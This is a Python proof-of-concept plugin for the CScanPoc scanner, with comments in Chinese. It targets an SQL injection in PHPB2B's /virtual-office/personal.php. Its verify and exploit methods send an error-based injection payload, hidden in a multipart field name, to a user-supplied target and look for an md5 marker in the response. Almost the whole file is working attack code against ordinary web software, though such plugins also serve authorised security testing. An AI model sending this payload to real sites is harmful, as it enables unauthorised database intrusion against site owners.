# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urlparse


class Vuln(ABVuln):
    vuln_id = 'PHPB2B_0004'  # 平台漏洞编号，留空
    name = 'PHPB2B某处注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-11-23'  # 漏洞公布时间
    desc = '''
        PHPB2B 漏洞文件/virtual-office/personal.php

        Content-Disposition: form-data; name="memberfield[first_name]"
        Content-Disposition: form-data; name="memberfield[last_name]"
        .
        .
        .
        first_name,last_name,gender,address,zipcode,qq,icq,msn,yahoo,skype,tel,fax,mobile,site_url,area_id 等未过滤。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/2482/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPB2B'  # 漏洞应用名称
    product_version = '官方最新版本'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e942277e-f6bf-412e-a32f-fa6f43ce15e0'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-09'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            s = requests.session()
            payload = '/virtual-office/personal.php'
            data = {
                'memberfield[first_name FROM pb_thk_memberfields where 1=1 and (select 1 from (select count(*),concat(md5(c),floor(rand(0)*2))x from information_schema.tables group by x)a)#]': (None, 'cscan')
            }
            url = self.target + payload
            r = s.post(url, files=data, allow_redirects=False)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            s = requests.session()
            payload = '/virtual-office/personal.php'
            data = {
                'memberfield[first_name FROM pb_thk_memberfields where 1=1 and (select 1 from (select count(*),concat(md5(c),floor(rand(0)*2))x from information_schema.tables group by x)a)#]': (None, 'cscan')
            }
            url = self.target + payload
            r = s.post(url, files=data, allow_redirects=False)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
